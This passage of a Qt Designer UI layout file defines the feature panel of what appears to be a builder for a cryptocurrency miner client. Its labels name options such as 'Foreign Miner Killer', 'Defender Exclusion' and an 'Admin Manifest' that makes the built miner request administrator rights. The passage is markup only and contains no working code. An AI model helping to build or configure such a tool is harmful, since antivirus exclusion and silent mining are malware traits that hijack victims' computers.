       <!-- ============ FEATURES ============ -->
       <item>
        <widget class="QGroupBox" name="corefeatures">
         <property name="title">
          <string>FEATURES (Priority Order)</string>
         </property>
         <layout class="QVBoxLayout" name="coreFeaturesLayout">
          <property name="spacing">
           <number>6</number>
          </property>

          <item>
           <widget class="QLabel" name="featuresNote">
            <property name="text">
             <string>Foreign Miner Killer and Defender Exclusion require the Admin Manifest, which makes the built client request administrator privileges at launch. The builder itself does not need to run elevated.</string>
            </property>
            <property name="wordWrap">
             <bool>true</bool>
            </property>
            <property name="role" stdset="0">
             <string notr="true">faint</string>
            </property>
           </widget>
          </item>

          <!-- PRIORITY 1: Admin Manifest -->
          <item>
           <layout class="QHBoxLayout" name="featureRow1" stretch="1,0">
            <property name="spacing">
             <number>12</number>
            </property>
            <item>
             <layout class="QVBoxLayout" name="featureText1">
              <property name="spacing">
               <number>1</number>
              </property>
              <item>
               <widget class="QLabel" name="featureTitle1">
                <property name="text">
                 <string>P1: Admin Manifest</string>
                </property>
                <property name="role" stdset="0">
                 <string notr="true">fieldLabel</string>
                </property>
               </widget>
              </item>
              <item>
               <widget class="QLabel" name="featureSubtitle1">
                <property name="text">
                 <string>Builds the miner with a manifest that requests administrator rights. Windows shows a UAC prompt at launch.</string>
